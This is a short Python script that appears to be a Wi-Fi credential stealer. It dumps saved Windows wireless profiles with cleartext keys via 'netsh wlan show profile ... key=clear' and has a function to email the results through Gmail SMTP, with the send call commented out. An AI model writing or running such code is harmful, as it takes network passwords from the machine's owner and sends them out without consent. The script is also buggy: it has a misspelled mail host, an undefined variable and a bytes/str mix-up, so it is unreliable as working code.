#!/usr/bin/env python

import subprocess, smtplib, re


def send_mail(email, password, message):
    server = smtplib.SMTP("smptp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()


command = "netsh wlan show profile UPC723762 key=clear"
networks = subprocess.check_output(command, shell=True)
network_names_list = re.findall(r"(?:Profile\s*:\s)(.*)", networks)
print(nnetwork_names)

result = ""
for network_name in network_names_list:
    command = " netsh wlan show profile " + network_name + " key=clear"
    current_result = subprocess.check_output(command, shell=True)
    result = result + current_result

# send_mail("wadaw@gmail.com", "abc123", result)